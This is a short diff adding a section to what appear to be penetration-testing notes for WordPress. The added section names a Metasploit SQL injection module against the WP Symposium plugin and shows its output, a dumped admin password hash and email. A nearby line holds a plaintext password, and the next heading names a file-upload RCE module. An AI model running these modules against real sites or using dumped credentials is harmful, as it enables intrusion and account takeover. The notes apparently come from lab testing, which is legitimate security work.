@@ -213,6 +213,11 @@ password: pass123
 ```
 
 
+## Metasploit Exploit - SQL Injection - admin/http/wp_symposium_sql_injection
+```
+[+] 192.168.209.23:80 - admin           $P$BYWgfD7pa572QS9YFoeVVmhrIhBAx0. abc@gmail.com
+```
+
 ## Metasploit Exploit - RCE - exploit/unix/webapp/wp_reflexgallery_file_upload
 ```
 
